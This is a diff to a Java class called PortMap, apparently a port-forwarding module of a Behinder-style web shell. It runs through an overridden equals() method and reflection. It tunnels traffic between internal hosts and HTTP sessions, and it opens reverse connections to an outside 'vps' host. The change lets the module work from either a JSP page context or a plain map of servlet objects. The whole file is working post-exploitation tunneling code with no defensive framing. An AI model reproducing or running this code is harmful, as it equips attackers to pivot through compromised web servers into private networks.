@@ -6,11 +6,12 @@ import java.net.InetSocketAddress;
 import java.nio.ByteBuffer;
 import java.nio.channels.SocketChannel;
 import java.util.Enumeration;
+import java.util.Map;
 import javax.servlet.ServletOutputStream;
-import javax.servlet.http.HttpServletRequest;
+import javax.servlet.ServletRequest;
+import javax.servlet.ServletResponse;
 import javax.servlet.http.HttpServletResponse;
 import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class PortMap implements Runnable {
    public static String action;
@@ -20,8 +21,8 @@ public class PortMap implements Runnable {
    public static String remoteIP;
    public static String remotePort;
    public static String extraData;
-   private HttpServletRequest Request;
-   private HttpServletResponse Response;
+   private ServletRequest Request;
+   private ServletResponse Response;
    private HttpSession Session;
    String localKey;
    String remoteKey;
@@ -29,20 +30,16 @@ public class PortMap implements Runnable {
    HttpSession httpSession;
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = (HttpServletResponse)page.getResponse();
-      this.Request = (HttpServletRequest)page.getRequest();
-
       try {
-         this.portMap(page);
-      } catch (Exception var4) {
+         this.fillContext(obj);
+         this.portMap();
+      } catch (Exception var3) {
       }
 
       return true;
    }
 
-   public void portMap(PageContext page) throws Exception {
+   public void portMap() throws Exception {
       String localSessionKey = "local_" + targetIP + "_" + targetPort + "_" + socketHash;
       SocketChannel socketChannel = null;
       if (action.equals("createLocal")) {
@@ -53,25 +50,24 @@ public class PortMap implements Runnable {
             socketChannel.connect(new InetSocketAddress(target, port));
             socketChannel.configureBlocking(false);
             this.Session.setAttribute(localSessionKey, socketChannel);
-            this.Response.setStatus(200);
-         } catch (Exception var10) {
-            Exception e = var10;
-            var10.printStackTrace();
+            ((HttpServletResponse)this.Response).setStatus(200);
+         } catch (Exception var9) {
+            Exception e = var9;
             ServletOutputStream so = null;
 
             try {
-               so = this.Response.getOutputStream();
+               so = ((HttpServletResponse)this.Response).getOutputStream();
                so.write(new byte[]{55, 33, 73, 54});
                so.write(e.getMessage().getBytes());
                so.flush();
                so.close();
-            } catch (IOException var9) {
-               var9.printStackTrace();
+            } catch (IOException var8) {
+               var8.printStackTrace();
             }
          }
       } else {
          Exception e;
-         ServletOutputStream so = null;
+         ServletOutputStream so;
          if (action.equals("read")) {
             socketChannel = (SocketChannel)this.Session.getAttribute(localSessionKey);
             if (socketChannel == null) {
@@ -82,6 +78,7 @@ public class PortMap implements Runnable {
                ByteBuffer buf = ByteBuffer.allocate(512);
                socketChannel.configureBlocking(false);
                int bytesRead = socketChannel.read(buf);
+
                for(so = this.Response.getOutputStream(); bytesRead > 0; bytesRead = socketChannel.read(buf)) {
                   so.write(buf.array(), 0, bytesRead);
                   so.flush();
@@ -90,10 +87,9 @@ public class PortMap implements Runnable {
 
                so.flush();
                so.close();
-            } catch (Exception var12) {
-               e = var12;
-               var12.printStackTrace();
-               this.Response.setStatus(200);
+            } catch (Exception var11) {
+               e = var11;
+               ((HttpServletResponse)this.Response).setStatus(200);
                socketChannel = null;
 
                try {
@@ -103,8 +99,8 @@ public class PortMap implements Runnable {
                   so.flush();
                   so.close();
                   socketChannel.socket().close();
-               } catch (IOException var8) {
-                  var8.printStackTrace();
+               } catch (IOException var7) {
+                  var7.printStackTrace();
                }
             }
          } else if (action.equals("write")) {
@@ -120,8 +116,8 @@ public class PortMap implements Runnable {
                while(buf.hasRemaining()) {
                   socketChannel.write(buf);
                }
-            } catch (Exception var11) {
-               e = var11;
+            } catch (Exception var10) {
+               e = var10;
                socketChannel = null;
 
                try {
@@ -131,8 +127,8 @@ public class PortMap implements Runnable {
                   so.flush();
                   so.close();
                   socketChannel.socket().close();
-               } catch (IOException var7) {
-                  var7.printStackTrace();
+               } catch (IOException var6) {
+                  var6.printStackTrace();
                }
             }
          } else {
@@ -149,7 +145,7 @@ public class PortMap implements Runnable {
                }
             } else if (action.equals("createRemote")) {
                (new Thread(new PortMap(this.localKey, this.remoteKey, "create", this.Session))).start();
-               this.Response.setStatus(200);
+               ((HttpServletResponse)this.Response).setStatus(200);
             } else if (action.equals("closeRemote")) {
                this.Session.setAttribute("remoteRunning", false);
                attributeNames = this.Session.getAttributeNames();
@@ -177,7 +173,7 @@ public class PortMap implements Runnable {
    }
 
    public void run() {
-      int bytesRead;
+      int bytesRead=0;
       if (this.type.equals("create")) {
          this.httpSession.setAttribute("remoteRunning", true);
 
@@ -191,7 +187,6 @@ public class PortMap implements Runnable {
                remoteSocketChannel.connect(new InetSocketAddress(vps, bytesRead));
                String remoteKey = "remote_remote_" + remoteSocketChannel.socket().getLocalPort() + "_" + targetIP + "_" + targetPort;
                this.httpSession.setAttribute(remoteKey, remoteSocketChannel);
-
                ByteBuffer buf = ByteBuffer.allocate(512);
                if ((bytesRead = remoteSocketChannel.read(buf)) > 0) {
                   remoteSocketChannel.configureBlocking(true);
@@ -277,16 +272,31 @@ public class PortMap implements Runnable {
             this.getClass();
             Base64 = Class.forName("java.util.Base64");
             Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
-            result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text);
+            result = (byte[])((byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, text));
          } else {
             this.getClass();
             Base64 = Class.forName("sun.misc.BASE64Decoder");
             Decoder = Base64.newInstance();
-            result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text);
+            result = (byte[])((byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, text));
          }
       } catch (Exception var6) {
       }
 
       return result;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = (ServletRequest)obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = (ServletResponse)obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = (HttpSession)obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = (HttpSession)objMap.get("session");
+         this.Response = (ServletResponse)objMap.get("response");
+         this.Request = (ServletRequest)objMap.get("request");
+      }
+
+      this.Response.setCharacterEncoding("UTF-8");
    }
 }
